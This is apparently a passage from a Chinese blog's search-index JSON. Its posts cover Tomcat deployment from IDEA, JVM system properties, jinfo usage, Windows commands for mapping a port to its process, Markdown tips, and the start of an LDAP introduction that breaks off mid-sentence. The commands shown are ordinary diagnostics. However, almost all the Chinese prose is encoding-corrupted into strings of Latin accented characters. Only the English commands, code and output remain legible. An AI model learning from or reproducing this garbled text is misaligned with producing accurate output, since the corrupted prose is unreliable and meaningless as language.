ç®€å•ç†è§£ï¼šIDEAé€šè¿‡å¤åˆ¶é…ç½®æ–‡ä»¶ï¼Œè¾¾åˆ°ä¸ä¿®æ”¹æºé…ç½®æ–‡ä»¶çš„æ–¹å¼ï¼Œè‡ªåŠ¨è®¾ç½®äº†ä¸€ç³»åˆ—é…ç½®ï¼Œä½¿å…¶å’Œå·¥ç¨‹è¾“å‡ºæ–‡ä»¶ç›¸å…³è”\nä½†æ˜¯ç”±äºåªæœ‰é…ç½®æ–‡ä»¶è¢«å¤åˆ¶ï¼Œæ‰€ä»¥æ‰§è¡Œæ–‡ä»¶è¿˜æ˜¯Tomcatå®‰è£…ç›®å½•ä¸‹çš„ï¼Œä¸”å¦‚æœæœ‰.jaréœ€è¦ä¾èµ–ï¼Œä¹Ÿéœ€è¦æ”¾åˆ°Tomcatå®‰è£…è·¯å¾„çš„libç›®å½•ä¸‹\nIDEAè”åŠ¨éƒ¨ç½²Tomcatè¿›è¡Œéƒ¨ç½² å¦‚ä½•éƒ¨ç½²ï¼ŸIDEAæä¾›äº†ä¸¤ç§æ–¹å¼ï¼Œå¦‚ä¸‹å›¾ï¼š\nwar æ¨¡å¼ï¼šå°†WEBå·¥ç¨‹ä»¥åŒ…çš„å½¢å¼ä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚ è¿™ç§æ¨¡å¼å¯ä»¥ç§°ä¹‹ä¸ºæ˜¯å‘å¸ƒæ¨¡å¼ï¼Œæ‰“åŒ…ï¼Œå³æ˜¯å…ˆå°†é¡¹ç›®æ‰“æˆwaråŒ…ï¼Œå†è¿›è¡Œå‘å¸ƒã€‚\nwar æ¨¡å¼ä¸‹çš„æ˜ å°„è®¾ç½®å¦‚ä¸‹ conf\\Catalina\\localhost\\jndidemo_war.xml\n1 \u0026lt;Context path=\u0026#34;/jndidemo_war\u0026#34; docBase=\u0026#34;D:\\Users\\Dan\\Code\\Java\\jndidemo\\out\\artifacts\\jndidemo_war\\jndidemo_war.war\u0026#34; /\u0026gt; war exploded æ¨¡å¼ï¼šå°†WEBå·¥ç¨‹ä»¥å½“å‰æ–‡ä»¶å¤¹çš„ä½ç½®å…³ç³»ä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚ è¿™ç§æ¨¡å¼æ˜¯æ‰€æœ‰æ–‡ä»¶å¤¹æ–‡ä»¶è·¯å¾„ä¸æ‰“åŒ…çš„æƒ…å†µä¸‹ï¼ŒåŒ…æ‹¬ jsp é¡µé¢ ã€servlet ç­‰ç­‰è¿æ¥åˆ° Tomcat è¿›è¡ŒåŠ è½½éƒ¨ç½²\nå› æ­¤è¿™ç§æ–¹å¼æ”¯æŒçƒ­éƒ¨ç½²ï¼Œä¸€èˆ¬åœ¨å¼€å‘çš„æ—¶å€™ä¹Ÿæ˜¯ç”¨è¿™ç§æ–¹å¼ã€‚\nwar exploded æ¨¡å¼ä¸‹çš„æ˜ å°„è®¾ç½®å¦‚ä¸‹ conf\\Catalina\\localhost\\jndidemo_war_exploded.xml\n1 \u0026lt;Context path=\u0026#34;/jndidemo_war_exploded\u0026#34; docBase=\u0026#34;D:\\Users\\Dan\\Code\\Java\\jndidemo\\out\\artifacts\\jndidemo_war_exploded\u0026#34; /\u0026gt; Tips åœ¨é…ç½® Tomcat è¿›è¡Œçƒ­éƒ¨ç½²æ—¶ï¼Œè®¾ç½®æ‰§è¡Œæ›´æ–°æ—¶æ›´æ–°èµ„æºæˆ–æ‰‹åŠ¨é‡å¯æœåŠ¡å™¨å³å¯ï¼Œè¿™æ ·æ›´æ–°çš„æœåŠ¡å°±èƒ½åŠæ—¶åœ°æ˜¾ç¤ºå‡ºæ¥äº†ã€‚\nRef https://blog.csdn.net/Helen_1997_1997/article/details/131935349\nhttps://blog.csdn.net/m0_68988603/article/details/124285667\n","date":"2024-12-06T10:28:11+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241206102953223.png","permalink":"https://d4n-sec.github.io/p/ideatomcat/","title":"IDEAä¸Tomcat"},{"content":"Java System Properties éšä½ æ€ä¹ˆå«ï¼šé…ç½®å‚æ•°/å¯åŠ¨å±æ€§/ç¯å¢ƒå˜é‡/ç³»ç»Ÿå±æ€§ï¼Œéƒ½å¯ä»¥ï¼Œåæ­£å¤§æ¦‚ç‡éƒ½æ˜¯æŒ‡Java System Properties\nä¸ºäº†æ–¹ä¾¿å’Œç»Ÿä¸€ï¼Œæœ¬æ–‡ä¸‹é¢ç»Ÿä¸€å«åšï¼šJVM å¯åŠ¨å‚æ•°\nå±æ€§ ä¸‹é¢ç»™å‡ºéƒ¨åˆ†å±æ€§å\nå±æ€§å è¯´æ˜ ç¤ºä¾‹å€¼ java.version Javaç‰ˆæœ¬å· 11.0.5 java.version.date Javaç‰ˆæœ¬æ—¥æœŸ 2019-10-15 java.vendor Javaä¾›åº”å•†æŒ‡å®šå­—ç¬¦ä¸² Oracle Corporation java.vendor.url Javaä¾›åº”å•†URL http://java.oracle.com/ java.vendor.version Javaä¾›åº”å•†ç‰ˆæœ¬ 18.9 java.home Javaå®‰è£…æ ¹ç›®å½• /usr/lib/jvm/jdk-11.0.5 java.class.version Java ç±»æ–‡ä»¶ç‰ˆæœ¬å· 55.0 java.class.path Java ç±»è·¯å¾„ å¤ªé•¿ï¼Œè¿™é‡Œçœç•¥ os.name æ“ä½œç³»ç»Ÿå Linux os.arch æ“ä½œç³»ç»Ÿæ¶æ„ amd64 os.version æ“ä½œç³»ç»Ÿç‰ˆæœ¬ 5.0.0-37-generic file.separator æ–‡ä»¶åˆ†éš”ç¬¦ / path.separator è·¯å¾„åˆ†éš”ç¬¦ : line.separator æ¢è¡Œç¬¦ \\n user.name ç”¨æˆ·è´¦å· lhing17 user.home ç”¨æˆ·æ ¹ç›®å½• /home/lhing17 user.dir ç”¨æˆ·å½“å‰å·¥ä½œç›®å½• /home/lhing17/IdeaProjects/rocketDownloader é…ç½® ä½¿ç”¨java -Dé…ç½®ç³»ç»Ÿå±æ€§\nç¬”è€…è®°å¾—ï¼š-Xä¹Ÿå¯ä»¥é…ç½®ä¸€äº›å±æ€§ï¼Œæœ‰å…´è¶£å¯ä»¥è‡ªè¡Œæ‹“å±•\næ ¼å¼ï¼šjava -Dkey=value\nä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 package jndi.example.study; public class PropertiesTest { public static void main(String[] args) { System.out.println(System.getProperty(\u0026#34;configurePath\u0026#34;)); } } ç¤ºä¾‹\n1 2 3 \u0026gt;\u0026#34;D:\\Program Files\\Java\\jdk-17.0.11\\bin\\java.exe\u0026#34; -Dfile.encoding=UTF-8 -DconfigurePath=hello1 jndi.example.study.PropertiesTest # è¾“å‡º hello1 ","date":"2024-12-05T18:09:35+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241205181225915.png","permalink":"https://d4n-sec.github.io/p/jvmproperties/","title":"JVM å¯åŠ¨å±æ€§/ç¯å¢ƒå˜é‡"},{"content":"å‰æƒ…æè¦ ç´§æ¥æ­¤æ–‡çš„å‰æƒ…æè¦\nåœ¨æ‰¾åˆ°å¯¹åº”ç«¯å£å¯¹åº”çš„æ–‡ä»¶ç›®å½•åï¼Œæœ‰ç‚¹ç»æœ›ï¼ŒJDK ç›®å½•è¿ä¸Šäº†æˆ‘çš„çŸ¥è¯†ç‚¹ï¼Œå´å‡»ç¢äº†æˆ‘çš„å¹»æƒ³\nä½†æ˜¯å’±ä¸æ˜¯å–„äºè®¤è¾“çš„äººï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥çœ‹åˆ°æ­£åœ¨è¿è¡Œçš„javaè¿›ç¨‹çš„ç›¸å…³é…ç½®å‚æ•°æˆ–è€…ç¯å¢ƒå˜é‡å‘¢ï¼Ÿ\nç­”æ¡ˆï¼šæœ‰çš„ï¼Œæ‰€ä»¥å¦‚ä¸‹\nä½†æ˜¯å³ä½¿çŸ¥é“äº†ç¯å¢ƒå˜é‡ï¼Œç”±äºæ˜¯é€šè¿‡æ¡ˆä¾‹é€šè¿‡Tomcatéƒ¨ç½²ï¼ˆç§»æ¤åˆ°ç±»ä¸­ç›´æ¥è¿è¡Œå¤±è´¥ï¼‰ï¼Œæ‰€ä»¥ä¹Ÿæ— æ³•æ’é™¤æ˜¯å¦æ˜¯Tomcatå‘èµ·è¿æ¥è¿˜æ˜¯ä¸šåŠ¡ä»£ç å‘èµ·è¿æ¥\nä¸ç®¡æ€ä¹ˆè¯´ï¼Œå­¦åˆ°äº†å°±è®°å½•\nJinfo jinfo â€” æŸ¥çœ‹è¿›ç¨‹å‚æ•°\njinfo æ˜¯ JDK è‡ªå¸¦çš„å‘½ä»¤ï¼Œå¯ä»¥ç”¨æ¥æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„ java åº”ç”¨ç¨‹åºçš„æ‰©å±•å‚æ•°ï¼ŒåŒ…æ‹¬ Java System å±æ€§ å’Œ JVMå‘½ä»¤è¡Œå‚æ•°ï¼›ä¹Ÿå¯ä»¥åŠ¨æ€çš„ä¿®æ”¹æ­£åœ¨è¿è¡Œçš„ JVM ä¸€äº›å‚æ•°ã€‚å½“ç³»ç»Ÿå´©æºƒæ—¶ï¼Œjinfoå¯ä»¥ä»coreæ–‡ä»¶é‡Œé¢çŸ¥é“å´©æºƒçš„Javaåº”ç”¨ç¨‹åºçš„é…ç½®ä¿¡æ¯ã€‚\njinfo -help ç»“æœå¦‚ä¸‹ï¼š\nå‚æ•°è¯´æ˜ï¼š\n-flag \u0026lt;name\u0026gt;ï¼šæ‰“å°æŒ‡å®šåç§°çš„å‚æ•°ã€‚ -flag [+|-]\u0026lt;name\u0026gt; ï¼šæ‰“å¼€æˆ–å…³é—­å‚æ•°ã€‚ -flag \u0026lt;name\u0026gt;=\u0026lt;value\u0026gt; ï¼šè®¾ç½®å‚æ•°ã€‚ -flags ï¼šæ‰“å°å½“å‰æŒ‡å®šjavaè¿›ç¨‹ä¸­å·²ç»è®¾å®šçš„æ‰€æœ‰JVMå‚æ•°ä¿¡æ¯ã€‚ -sysprops ï¼šæ‰“å°å½“å‰javaè¿›ç¨‹ä¸­è®¾å®šçš„ç³»ç»Ÿç¯å¢ƒå‚æ•°ã€‚ \u0026lt;no option\u0026gt; ï¼šæ‰“å°ä¸Šé¢ä¸¤ä¸ªé€‰é¡¹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026gt; jinfo -help Usage: jinfo [option] \u0026lt;pid\u0026gt; (to connect to running process) jinfo [option] \u0026lt;executable \u0026lt;core\u0026gt; (to connect to a core file) jinfo [option] [server_id@]\u0026lt;remote server IP or hostname\u0026gt; (to connect to remote debug server) where \u0026lt;option\u0026gt; is one of: -flag \u0026lt;name\u0026gt; to print the value of the named VM flag -flag [+|-]\u0026lt;name\u0026gt; to enable or disable the named VM flag -flag \u0026lt;name\u0026gt;=\u0026lt;value\u0026gt; to set the named VM flag to the given value -flags to print VM flags -sysprops to print Java system properties \u0026lt;no option\u0026gt; to print both of the above -h | -help to print this help message å¸¸ç”¨å‘½ä»¤ -flag æ™®é€šç”¨æ³• jinfo -flags pid\næ‰“å°å½“å‰æŒ‡å®šjavaè¿›ç¨‹ä¸­å·²ç»è®¾å®šçš„æ‰€æœ‰JVMå‚æ•°ä¿¡æ¯\nè¾“å‡ºå¦‚ä¸‹\n1 2 3 4 # 8008 ä¿®æ”¹ä¸ºå·²çŸ¥çš„ pid C:\\Users\\Dan\u0026gt;\u0026#34;D:\\Program Files\\Java\\jdk-17.0.11\\bin\\jinfo.exe\u0026#34; -flags 8008 VM Flags: -XX:CICompilerCount=4 -XX:ConcGCThreads=2 -XX:G1ConcRefinementThreads=8 -XX:G1EagerReclaimRemSetThreshold=16 -XX:G1HeapRegionSize=2097152 -XX:GCDrainStackTargetSize=64 -XX:InitialHeapSize=266338304 -XX:+ManagementServer -XX:MarkStackSize=4194304 -XX:MaxHeapSize=4242538496 -XX:MaxNewSize=2543845376 -XX:MinHeapDeltaBytes=2097152 -XX:MinHeapSize=8388608 -XX:NonNMethodCodeHeapSize=5839372 -XX:NonProfiledCodeHeapSize=122909434 -XX:ProfiledCodeHeapSize=122909434 -XX:ReservedCodeCacheSize=251658240 -XX:+SegmentedCodeCache -XX:SoftMaxHeapSize=4242538496 -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseFastUnorderedTimeStamps -XX:+UseG1GC -XX:-UseLargePagesIndividualAllocation æ­¤é¡¹è¿”å›å€¼å¯¹äºç¬”è€…æ¥è¯´ï¼Œæš‚æ—¶æ²¡æœ‰å¤šå°‘æœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ‰€ä»¥æœ‰å¦‚ä¸‹\næ‰“å°æŒ‡å®šåç§°çš„å‚æ•° æ³¨æ„æ˜¯ -flag è€Œä¸æ˜¯ flags\njinfo -flag [æŒ‡å®šå‚æ•°] pid\nè¾“å‡ºå¦‚ä¸‹\n1 2 3 # 8008 ä¿®æ”¹ä¸ºå·²çŸ¥çš„ pid C:\\Users\\Dan\u0026gt;\u0026#34;D:\\Program Files\\Java\\jdk-17.0.11\\bin\\jinfo.exe\u0026#34; -flag MinHeapDeltaBytes 24348 -XX:MinHeapDeltaBytes=2097152 æ‰“å¼€æˆ–å…³é—­å‚æ•° jinfo -flag [+/-][æŒ‡å®šå‚æ•°] pidï¼Œä¸”å‚æ•°å¿…é¡»è¢«JVMæ”¯æŒ\nç¤ºä¾‹ç»™å‡ºç½‘ä¸Šçš„ç»“æœ\nç¤ºä¾‹ è¿è¡Œå¦‚ä¸‹\n1 jinfo -flag +PrintGC 7663 æŸ¥çœ‹\njinfo -flags 7663\nå›¾ä¸­å¯è§ï¼Œå‚æ•°å·²ç»æˆåŠŸæ·»åŠ \n-sysprops jinfo -sysprops pid\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 8008 ä¿®æ”¹ä¸ºå·²çŸ¥çš„ pid C:\\Users\\Dan\u0026gt;\u0026#34;D:\\Program Files\\Java\\jdk-17.0.11\\bin\\jinfo.exe\u0026#34; -sysprops 8008 Java System Properties: #Tue Dec 03 16:00:11 CST 2024 java.specification.version=17 sun.cpu.isalist=amd64 sun.jnu.encoding=GBK java.class.path=D\\:\\\\ProgramFiles\\\\Tomcat\\\\Tomcat.11.0.0-fastjson\\\\bin\\\\bootstrap.jar;D\\:\\\\ProgramFiles\\\\Tomcat\\\\Tomcat.11.0.0-fastjson\\\\bin\\\\tomcat-juli.jar java.vm.vendor=Oracle Corporation sun.arch.data.model=64 user.variant= catalina.useNaming=true ..... user.dir=D\\:\\\\ProgramFiles\\\\Tomcat\\\\Tomcat.11.0.0-fastjson\\\\bin ..... Ref https://blog.csdn.net/wangzhongshun/article/details/122298396\n","date":"2024-12-05T17:18:22+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241205172029711.png","permalink":"https://d4n-sec.github.io/p/jvmruntimepathenv/","title":"JVM è¿è¡Œæ—¶å‚æ•°æŸ¥è¯¢"},{"content":"å‰æƒ…æè¦ ç”±äºæœ‰è¿™ä¸ªå¾…åŠçš„å­˜åœ¨ï¼Œæˆ‘å°†å°è¯•å»è¯æ˜ï¼šJNDIé…ç½®åï¼Œä¸æ•°æ®åº“é€šä¿¡å±‚çš„è¿æ¥ä»£ç æ˜¯äº¤ç»™äº† Tomcatï¼ŒJBOSS ç­‰å®Œæˆ\nè™½ç„¶å¯èƒ½æ²¡ä»€ä¹ˆæ„ä¹‰ï¼Œä½†æ˜¯æœ‰ç–‘é—®æƒ³è¦è‡ªå·±è§£å†³ä¸æ€»æ˜¯åçš„\nåœ¨Debugæ—¶ï¼Œå°è¯•é€šè¿‡é€šè®¯å±‚é¢è¯æ˜ä¸ºTomcatä¸Mysqlé€šä¿¡\nåœ¨æŠ“åŒ…è¿‡ç¨‹ä¸­ï¼Œå¾ˆé—æ†¾ï¼Œåªèƒ½å¾—åˆ°ç›®çš„ç«¯å£å’Œæ¥æºç«¯å£ä¿¡æ¯ï¼ˆå½“ç„¶å’¯ï¼Œç½‘ç»œå±‚é¢é€šè®¯è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢å¸¦ä»€ä¹ˆæœ¬åœ°è¿›ç¨‹ä¿¡æ¯å‘¢ï¼Ÿï¼‰ï¼Œå¦‚ä¸‹å›¾\n3306æ˜¯MySQLçš„é»˜è®¤ç«¯å£ï¼Œå¦‚æœ4894æ˜¯å›ºå®šç«¯å£ï¼Œä¸”è¯¥æœåŠ¡å±äºTomcatçš„è¯ï¼Œæ­¤æ¬¡è¯æ˜å°±å¯ä»¥å‘Šä¸€æ®µè½äº†\næ˜¾ç„¶æ²¡æœ‰é‚£ä¹ˆç®€å•ï¼Œé‡æ–°è¿è¡Œå‘ç°è¿æ¥æ•°æ®åº“3306-Server ç«¯å£æ‰€å¯¹åº”çš„Clientç«¯å£å¹¶ä¸å›ºå®šï¼Œé‚£ä¹ˆåªèƒ½è¯´æ˜å°†è¦è¿›è¡Œè¿æ¥æ—¶ï¼ŒClientä» OS å¤„ç”³è¯·äº†ä¸€ä¸ªç«¯å£ï¼Œä¹Ÿæ²¡æœ‰æŒ‡å®šã€‚\næ‰€ä»¥å¦‚æœå¯ä»¥æ‰¾åˆ°ç«¯å£å¯¹åº”çš„è¿›ç¨‹å¯¹åº”çš„æ–‡ä»¶ä½ç½®ï¼Œå¦‚æœè¯¥æ–‡ä»¶å¤„äºTomcatç›®å½•ï¼Œè€ŒéJDKï¼Œé¡¹ç›®ç›®å½•ï¼Œå²‚ä¸æ˜¯ä¹Ÿå¯ä»¥è¯æ˜æ˜¯Tomcatå‘èµ·è¿æ¥çš„ï¼Ÿ\nç­”æ¡ˆï¼šå¾ˆé—æ†¾ï¼Œä¸èƒ½ï¼Œæ‰¾åˆ°çš„æ˜¯ JDK ä¸­çš„ java.exe\nå½“ç„¶äº†ç¬¨è›‹ï¼ŒJVM ç®¡æ‰€æœ‰ï¼Œæ‰€ä»¥å¦‚æœæœ‰ java ç¨‹åºå‘èµ·è¿æ¥ï¼Œéƒ½éœ€è¦ç»è¿‡ JVM å•Šï¼ŒJVM å½“ç„¶æ¥æºäº java.exe å’¯ï¼Œç¬¨è›‹\nä½†æ˜¯å°½ç®¡è¿™æ˜¯è®©è‡ªå·±æ— è¯­çš„ä¸€æ¬¡è„‘æ´å°è¯•ï¼Œä½†è¿™æ¬¡çš„æ’æŸ¥æœ‰ä¸€äº›çŸ¥è¯†ç‚¹å¯ä»¥è®°ä¸‹æ¥ï¼Œæ•…æœ‰æ­¤æ–‡ç« \nç«¯å£å·æŸ¥è¿›ç¨‹id è¿›ç¨‹idï¼Œä¹Ÿå«pid\néœ€è¦çŸ¥é“çš„ä¸œè¥¿ï¼šéœ€è¦æŸ¥è¯¢çš„ç«¯å£å·\nåœ¨æœ‰ç«¯å£å·çš„å‰æä¸‹ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿›è¡Œç«¯å£æŸ¥è¯¢\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # åªçœ‹æŸä¸€ä¸ªç«¯å£ C:\\Users\\Dan\u0026gt;netstat -ano|findstr 5994 TCP 172.24.176.1:5994 172.24.189.19:3306 ESTABLISHED 20444 # æƒ³çœ‹çœ‹æ‰€æœ‰ç«¯å£ C:\\Users\\Dan\u0026gt;netstat -ano æ´»åŠ¨è¿æ¥ åè®® æœ¬åœ°åœ°å€ å¤–éƒ¨åœ°å€ çŠ¶æ€ PID TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 1140 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:1024 0.0.0.0:0 LISTENING 856 TCP 0.0.0.0:1999 0.0.0.0:0 LISTENING 15032 ........... æ ¹æ®pidï¼Œå°±å¯ä»¥ç¡®å®šä¸€ä¸ªå…·ä½“çš„è¿›ç¨‹äº†\nè¿›ç¨‹idæŸ¥ä»»åŠ¡å å‘½ä»¤å¦‚ä¸‹\n1 2 3 # 20444 ä¿®æ”¹ä¸ºéœ€æŸ¥è¯¢çš„ PID å· C:\\Users\\Dan\u0026gt;tasklist|findstr \u0026#34;20444\u0026#34; java.exe 20444 Console 1 184,196 K ä½†æ˜¯ç¬”è€…ä¸æ»¡è¶³ï¼Œç¬”è€…æƒ³è¦çŸ¥é“å¯æ‰§è¡Œæ–‡ä»¶çš„å…·ä½“ç›®å½•ä½ç½®\næ‰€ä»¥æœ‰ä¸‹\nè¿›ç¨‹idæŸ¥æ–‡ä»¶æ‰€åœ¨ä½ç½® å‘½ä»¤å¦‚ä¸‹\n1 2 3 4 # 20444 ä¿®æ”¹ä¸ºéœ€æŸ¥è¯¢çš„ PID å· C:\\Users\\Dan\u0026gt;wmic process where processid=20444 get processid,executablepath,name ExecutablePath Name ProcessId D:\\Program Files\\Java\\jdk-17.0.11\\bin\\java.exe java.exe 20444 OKï¼Œè®°å½•åœ¨æ­¤\n","date":"2024-12-05T16:46:33+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241205164904770.png","permalink":"https://d4n-sec.github.io/p/port-pid-taskfile/","title":"Windows æ ¹æ®ç«¯å£æŸ¥æ‰¾è¿›ç¨‹"},{"content":"å¯æŠ˜å å±•å¼€ 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;details\u0026gt;\u0026lt;summary\u0026gt;\u0026lt;font color=\u0026#34;#FF0000\u0026#34; size=\u0026#34;5\u0026#34;\u0026gt;å…è´£å£°æ˜ã€å¿…è¯»ã€‘\u0026lt;/font\u0026gt;\u0026lt;/summary\u0026gt; æœ¬å·¥å…·ä»…ä¾›å­¦ä¹ å’ŒæŠ€æœ¯ç ”ç©¶ä½¿ç”¨ï¼Œä¸å¾—ç”¨äºä»»ä½•å•†ä¸šæˆ–éæ³•è¡Œä¸ºï¼Œå¦åˆ™åæœè‡ªè´Ÿã€‚ æœ¬å·¥å…·çš„ä½œè€…ä¸å¯¹æœ¬å·¥å…·çš„å®‰å…¨æ€§ã€å®Œæ•´æ€§ã€å¯é æ€§ã€æœ‰æ•ˆæ€§ã€æ­£ç¡®æ€§æˆ–é€‚ç”¨æ€§åšä»»ä½•æ˜ç¤ºæˆ–æš—ç¤ºçš„ä¿è¯ï¼Œä¹Ÿä¸å¯¹æœ¬å·¥å…·çš„ä½¿ç”¨æˆ–æ»¥ç”¨é€ æˆçš„ä»»ä½•ç›´æ¥æˆ–é—´æ¥çš„æŸå¤±ã€è´£ä»»ã€ç´¢èµ”ã€è¦æ±‚æˆ–è¯‰è®¼æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚ æœ¬å·¥å…·çš„ä½œè€…ä¿ç•™éšæ—¶ä¿®æ”¹ã€æ›´æ–°ã€åˆ é™¤æˆ–ç»ˆæ­¢æœ¬å·¥å…·çš„æƒåˆ©ï¼Œæ— éœ€äº‹å…ˆé€šçŸ¥æˆ–æ‰¿æ‹…ä»»ä½•ä¹‰åŠ¡ã€‚ æœ¬å·¥å…·çš„ä½¿ç”¨è€…åœ¨ä¸‹è½½ã€å®‰è£…ã€è¿è¡Œæˆ–ä½¿ç”¨æœ¬å·¥å…·æ—¶ï¼Œå³è¡¨ç¤ºå·²é˜…è¯»å¹¶åŒæ„æœ¬å…è´£å£°æ˜ã€‚å¦‚æœ‰å¼‚è®®ï¼Œè¯·ç«‹å³åœæ­¢ä½¿ç”¨æœ¬å·¥å…·ï¼Œå¹¶åˆ é™¤æ‰€æœ‰ç›¸å…³æ–‡ä»¶ã€‚ \u0026lt;/details\u0026gt; æ•ˆæœ å…è´£å£°æ˜ã€å¿…è¯»ã€‘ æœ¬å·¥å…·ä»…ä¾›å­¦ä¹ å’ŒæŠ€æœ¯ç ”ç©¶ä½¿ç”¨ï¼Œä¸å¾—ç”¨äºä»»ä½•å•†ä¸šæˆ–éæ³•è¡Œä¸ºï¼Œå¦åˆ™åæœè‡ªè´Ÿã€‚\næœ¬å·¥å…·çš„ä½œè€…ä¸å¯¹æœ¬å·¥å…·çš„å®‰å…¨æ€§ã€å®Œæ•´æ€§ã€å¯é æ€§ã€æœ‰æ•ˆæ€§ã€æ­£ç¡®æ€§æˆ–é€‚ç”¨æ€§åšä»»ä½•æ˜ç¤ºæˆ–æš—ç¤ºçš„ä¿è¯ï¼Œä¹Ÿä¸å¯¹æœ¬å·¥å…·çš„ä½¿ç”¨æˆ–æ»¥ç”¨é€ æˆçš„ä»»ä½•ç›´æ¥æˆ–é—´æ¥çš„æŸå¤±ã€è´£ä»»ã€ç´¢èµ”ã€è¦æ±‚æˆ–è¯‰è®¼æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚\næœ¬å·¥å…·çš„ä½œè€…ä¿ç•™éšæ—¶ä¿®æ”¹ã€æ›´æ–°ã€åˆ é™¤æˆ–ç»ˆæ­¢æœ¬å·¥å…·çš„æƒåˆ©ï¼Œæ— éœ€äº‹å…ˆé€šçŸ¥æˆ–æ‰¿æ‹…ä»»ä½•ä¹‰åŠ¡ã€‚\næœ¬å·¥å…·çš„ä½¿ç”¨è€…åœ¨ä¸‹è½½ã€å®‰è£…ã€è¿è¡Œæˆ–ä½¿ç”¨æœ¬å·¥å…·æ—¶ï¼Œå³è¡¨ç¤ºå·²é˜…è¯»å¹¶åŒæ„æœ¬å…è´£å£°æ˜ã€‚å¦‚æœ‰å¼‚è®®ï¼Œè¯·ç«‹å³åœæ­¢ä½¿ç”¨æœ¬å·¥å…·ï¼Œå¹¶åˆ é™¤æ‰€æœ‰ç›¸å…³æ–‡ä»¶ã€‚\nè·³è½¬ ç‚¹å‡»å…³é”®å­—è½¬åˆ°å¯¹åº”ä½ç½®/æ–‡ç« \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 1.è·³è½¬åˆ°æœ¬æ–‡ä½ç½® 1.æœ¬æ–‡çš„æŒ‡å®šæ ‡é¢˜A [æŸä¸ªæ ‡é¢˜](#%E5%8F%AF%E6%8A%98%E5%8F%A0%E5%B1%95%E5%BC%80) ï¼ˆè¿™ä¸ªæ ‡é¢˜å°±æ˜¯æœ¬æ–‡çš„ç¬¬ä¸€ä¸ªæ ‡é¢˜ï¼‰ ï¼ˆå…¶ä¸­çš„\u0026#39;#\u0026#39;å·ä¸ºæ ¼å¼ç¬¦ï¼Œå‰©ä¸‹çš„æ˜¯URLç¼–ç ï¼‰ ## å¯æŠ˜å å±•å¼€ 2.æœ¬æ–‡æ–‡æœ¬ ç‚¹å‡»æˆ‘[å•Š](#ddd) ä¸­é—´æ–‡å­— \u0026lt;span id=\u0026#34;ddd\u0026#34;\u0026gt;åˆ°äº†\u0026lt;/span\u0026gt; 2.è·³è½¬åˆ°å…¶ä»–æ–‡ç«  1.åªåˆ°æ–‡ç« å³å¯ [æŒ‡å®šæ–‡ç« ](https://d4n-sec.github.io/p/blogtohugo/) 2.åˆ°æ–‡ç« çš„æŸä¸ªæ ‡é¢˜ [æŒ‡å®šæ–‡ç« æŒ‡å®šæ®µè½](https://d4n-sec.github.io/p/blogtohugo/#hugo-%E5%AE%89%E8%A3%85) 3.åˆ°æ–‡ç« çš„æŸä¸ªæ–‡æœ¬ æš‚æ—¶æ²¡æœ‰è¿™ä¸ªéœ€æ±‚ï¼Œä¸å»æŠ˜è…¾ æ•ˆæœ è·³è½¬åˆ°æœ¬æ–‡æŸæ ‡é¢˜ æŸä¸ªæ ‡é¢˜\nè·³è½¬åˆ°æœ¬æ–‡æŸæ–‡æœ¬ ç‚¹å‡»æˆ‘å•Š\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\nåˆ°äº†\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\nè·³è½¬åˆ°å…¶ä»–æ–‡ç«  æŒ‡å®šæ–‡ç« \næŒ‡å®šæ–‡ç« æŒ‡å®šæ®µè½\n","date":"2024-11-25T13:28:42+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241125133108907.png","permalink":"https://d4n-sec.github.io/p/usefullmarkdowngrammar/","title":"ä¸€äº›å¥½ç”¨çš„ MarkDown è¯­æ³•"},{"content":"What\u0026rsquo;s LDAP Lightweight Directory Access Protocol -\u0026gt; LDAP\nç›´è¯‘ï¼šè½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼ˆDirectory -\u0026gt; åˆå¯è¯‘ä¸ºç”µè¯ç°¿ï¼‰ï¼Œä½†æ˜¯æ„ä¹‰ä¸å‡†ç¡®\nä¸ç®¡æ˜¯ç›®å½•è¿˜æ˜¯ç”µè¯ç°¿ï¼Œæ ¸å¿ƒç‚¹ä¸ºæŸ¥æ‰¾\nå³ Directory æœåŠ¡å†…éƒ¨çš„æ•°æ®ç»„ç»‡å½¢å¼æ˜¯æ ‘å½¢ç»“æ„ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯æ–¹ä¾¿æŸ¥æ‰¾ã€‚å…¶æœ€å¼€å§‹å­˜åœ¨çš„ç›®çš„æ˜¯åšç™½é¡µã€é»„é¡µç±»åº”ç”¨ï¼Œè€Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç»“æ„åšå…¶å®ƒäº‹æƒ…ï¼Œæ¯”å¦‚ç”¨ä¸€ä¸ªLDAPæœåŠ¡ç®¡ç†å…¬å¸å†…æ‰€æœ‰åœ°æ–¹çš„ç”¨æˆ·ä¿¡æ¯ï¼Œè¿™æ 